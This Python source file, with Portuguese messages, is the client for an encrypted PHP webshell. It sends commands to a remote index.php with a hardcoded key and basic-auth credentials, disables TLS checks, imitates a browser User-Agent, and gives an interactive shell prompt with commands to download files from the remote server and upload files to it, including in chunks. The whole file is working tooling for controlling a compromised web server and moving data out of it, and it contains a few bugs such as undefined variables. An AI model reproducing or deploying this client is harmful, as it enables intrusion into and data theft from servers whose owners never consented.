from crypt import *
import requests, re, os
from utils import *
from tqdm import tqdm

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'

#https://stackoverflow.com/a/41041028/13886183
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
except AttributeError:
    pass

class Config(object):
    Url = 'http://x.x.x.x/index.php'
    User = 'user'
    Pass = 'pass'
    Key = 'sgMfr6*Q=UhpXPQcZavk#dkDyQ!Mg=C4XjqjpuMU+ebb#JUH&Hc!GZVD32GQ37mc'

    CookieIPValue = False
    CookieIPName = False

    Domain = ''

    Headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    AllowPing = True

class LocalCommands(object):
    def lping(args=None, l=0):
        if Config.AllowPing == False:
            Util.Warn("Ping desativado!")
            return True
        ms = Util.ping(Config.Domain)

        if ms == None:
            Util.Error(f'{Config.Domain} não está respondendo')
            return False

        Util.Info(f'Ping com host {Config.Domain} é de {ms} ms')
        return True

    def download(args, l=0):
        if l < 1:
            Util.Error("Usage: download [remote file] [local destination]")
            return False
        
        args = args.split(" ", 1)

        if len(args) != 2:
            args.append('./')
        
        dirname = args[1]
        filename = os.path.basename(args[1])
        if not os.path.isdir(dirname):
            dirname = os.path.dirname(dirname)
        else:
            filename = os.path.basename(args[0])
        
        if len(dirname) > 0:
            if dirname != '/' and not dirname.endswith('/'):
                dirname += '/'
            if not os.path.exists(dirname):
                Uitl.Error(f"O diretório '{dirname}' não foi encontrado")

        args[1] = dirname + filename
        if os.path.exists(args[1]) and os.path.isfile(args[1]):
            Util.Error(f"O arquivo '{args[1]}' já existe")
            return False
        
        Shell.download(args[0], args[1])
        return True
    def upload(args, l=0):
        if l < 1:
            Util.Error("Usage: upload [local file] [remote destination]")
            return False
        
        args = args.split(" ", 1)

        if len(args) != 2:
            args.append('./')
        
        if not os.path.isfile(args[0]):
            Util.Error(f"Arquivo {args[0]} não foi encontrado")
            return True
        if len(args[1]) < 1:
            args[1] = './'

        if args[1].endswith('/'):
            args[1] += os.path.basename(args[0])

        return Shell.upload(args[0], args[1])

    def uploadinblocks(args, l=0):
        if l < 1:
            Util.Error("Usage: uploadinblocks [local file] [remote destination] [blocksize]")
            return False
        
        args = args.split(" ", 1)

        if len(args) == 1:
            args.append('./')
        if len(args) == 2:
            args.append('1024')

        if not args[2].isnumeric():
            Util.Warn('Tamanho do bloco deve ser númerico, setado para 1024')
            args[2] = '1024'
        
        args[2] = int(args[2])

        if args[2] < 1:
            Util.Warn("Tamanho do bloco menor que 0, setado para 1024")
            args[2] = 1024
        
        if not os.path.isfile(args[0]):
            Util.Error(f"Arquivo {args[0]} não foi encontrado")
            return True
        if len(args[1]) < 1:
            args[1] = './'

        if args[1].endswith('/'):
            args[1] += os.path.basename(args[0])

        return Shell.uploadinblocks(args[0], args[1], args[2])
            
class Shell(object):
    Session = requests.Session()

    User = False
    Host = False
    Path = False



    def Send(cmd, resend=False):
        try:
            
            res = Shell.Session.post(Config.Url, data={'a': crypt.encode(cmd)}, headers=Config.Headers, verify=False, allow_redirects=False)

            if res.status_code == 401 and not resend:
                Util.Warn("Sessão expirada, tentando autenticar novamente...")

                if not Shell.Auth():
                    Util.Fatal("Não foi possível autenticar, tente novamente")
                
                return Shell.Send(cmd, True)

            if not Util.verifyCodes(res):
                return False

            info = res.headers.get('X-Info', '')
            if len(info) > 0:
                info = crypt.decode(info).split('|')
                if len(info) == 3:
                    Shell.Path,  Shell.User, Shell.Host = info

            return crypt.decode(res.text.strip())

        except requests.ConnectionError as e:
            Util.Fatal(e)

    def Auth():

        try:
            res = Shell.Session.get(Config.Url, headers={
                **{'Authorization': 'Basic ' + crypt.encode(f'{Config.User}:{Config.Pass}')},
                **Config.Headers
            }, allow_redirects=False, verify=False)

            if not Util.verifyCodes(res):
                return False

            if res.status_code == 200:
                info = res.headers.get('X-Info', '')
                if len(info) > 0:
                    info = crypt.decode(info).split('|')
                    if len(info) == 3:
                        Shell.Path,  Shell.User, Shell.Host = info
                        return True
            return False

        except requests.ConnectionError as e:
            Util.Fatal(e)

        return False

    def Init():
        Config.Domain = Util.domain(Config.Url)

        if Config.AllowPing and not LocalCommands.lping():
            return True

        crypt.setKey(Config.Key)
        if Config.CookieIPName != False:
            Shell.Session.cookies.set_cookie(requests.cookies.create_cookie(domain=Config.Domain, name=Config.CookieIPName, value=Config.CookieIPValue))

        if not Shell.Auth():
            Util.Error("Falha ao tentar se autenticar na webshell, verifique as credenciais")
            return True


        while True:
            cmd = Shell.cmd()

            if len(cmd) > 0:
                if cmd == 'exit':
                    return True

              
                cmd = Shell.Call(cmd)
                if isinstance(cmd, str) and len(cmd) > 0:
                    print(cmd)

    def Call(cmd):
        args = cmd.split(' ', 1)
        args[0] = args[0].lower()
        if hasattr(LocalCommands, args[0]) and callable(getattr(LocalCommands, args[0])):
            if len(args) < 2:
                args.append('')
            return getattr(LocalCommands, args[0])(args[1], len(args[1]))
        
        return Shell.Send(cmd)
    def cmd():
        return input(f'{Style.BRIGHT}{Fore.GREEN}{Shell.User}@{Shell.Host}{Fore.WHITE}:{Fore.BLUE}{Shell.Path}{Fore.WHITE}${Style.NORMAL} ').strip()

    def download(remotefile, local, resend=False):
        try:
            res = Shell.Session.post(Config.Url, data={'a': crypt.encode(f'download {remotefile}')}, headers=Config.Headers, verify=False, allow_redirects=False, stream=True)

            if res.status_code == 401 and not resend:
                Util.Warn("Sessão expirada, tentando autenticar novamente...")

                if not Shell.Auth():
                    Util.Fatal("Não foi possível autenticar, tente novamente")
                
                return Shell.download(remotefile, local, True)

            if not Util.verifyCodes(res):
                return False

            info = res.headers.get('X-Info', '')
            if len(info) > 0:
                info = crypt.decode(info).split('|')
                if len(info) == 3:
                    Shell.Path,  Shell.User, Shell.Host = info

            length = int(res.headers.get('content-length', 0))
            with open(local, 'wb') as file, tqdm(desc=os.path.basename(local), total=length, unit='iB', unit_scale=True, unit_divisor=1024) as bar:
                for data in res.iter_content(chunk_size=1024):
                    size = file.write(data)
                    bar.update(size)

            Util.Success(f"Arquivo salvo em {local}")
            return True

        except requests.ConnectionError as e:
            Util.Fatal(e)

    def upload(localfile, remotedest, resend=False):
        
        try:
       
            res = Shell.Session.post(Config.Url, data={
                'a': crypt.encode(f'upload {remotedest}')
            }, files={'file': open(localfile, 'rb')}, headers={'User-Agent': Config.Headers['User-Agent']}, verify=False, allow_redirects=False)
            
          
            if res.status_code == 401 and not resend:
                Util.Warn("Sessão expirada, tentando autenticar novamente...")

                if not Shell.Auth():
                    Util.Fatal("Não foi possível autenticar, tente novamente")
                
                return Shell.upload(localfile, remotedest, True)

            if not Util.verifyCodes(res):
                return False

            info = res.headers.get('X-Info', '')
            if len(info) > 0:
                info = crypt.decode(info).split('|')
                if len(info) == 3:
                    Shell.Path,  Shell.User, Shell.Host = info

            
            return crypt.decode(res.text.strip())

        except requests.ConnectionError as e:
            Util.Fatal(e)

    def uploadinblocks(localfile, remotedest, blocksize=1024):
        def startupload(filename, resend=False):
            try:
                res = Shell.Session.post(Config.Url, data={
                    'a': crypt.encode(f'startupload {filename}')
                }, headers=Config.Headers, verify=False, allow_redirects=False)

                if res.status_code == 401 and not resend:
                    Util.Warn("Sessão expirada, tentando autenticar novamente...")

                    if not Shell.Auth():
                        Util.Fatal("Não foi possível autenticar, tente novamente")
                    
                    return startupload(filename, True)
                

                return (res.status_code == 200, crypt.decode(res.text.strip()) if res.status_code != 200 else '')
            except requests.ConnectionError as e:
                Util.Fatal(e)
        
        def uploadblock(block):
            try:
                res = Shell.Session.post(Config.Url, data={
                    'a': crypt.encode(f'uploadblock {block}')
                }, headers=Config.Headers, verify=False, allow_redirects=False)

                if res.status_code == 401 and not resend:
                    Util.Warn("Sessão expirada, tentando autenticar novamente...")

                    if not Shell.Auth():
                        Util.Fatal("Não foi possível autenticar, tente novamente")
                    
                    return uploadblock(block, True)
                
                return (res.status_code == 202, crypt.decode(res.text.strip()) if res.status_code != 202 else '')
            except requests.ConnectionError as e:
                Util.Fatal(e)

        def stopupload():
            try:
                res = Shell.Session.post(Config.Url, data={
                    'a': crypt.encode(f'stopupload')
                }, headers=Config.Headers, verify=False, allow_redirects=False)

                if res.status_code == 401 and not resend:
                    Util.Warn("Sessão expirada, tentando autenticar novamente...")

                    if not Shell.Auth():
                        Util.Fatal("Não foi possível autenticar, tente novamente")
                    
                    return uploadblock(block, True)
                
                return crypt.decode(res.text.strip())
            except requests.ConnectionError as e:
                Util.Fatal(e)

        with open(localfile, 'rb') as file:
            r, m = startupload(remotedest)
            if r != True:
                return m
            
            content = file.read()

            content = crypt.encode(content.decode('latin-1'))

            size = len(content)

            k = size // blocksize + int(size % blocksize != 0)
            
            i = 0
            for j in tqdm(range(0, k)):
                r, m = uploadblock(content[i:i+blocksize])
                if r != True:
                    return m

                i += blocksize
            
            m = stopupload()
            return m
        return f"Não foi possível abrir o arquivo {localfile}"
            

    



def main():
    Config.AllowPing = False
    Shell.Init()

if __name__ == '__main__':
    main()
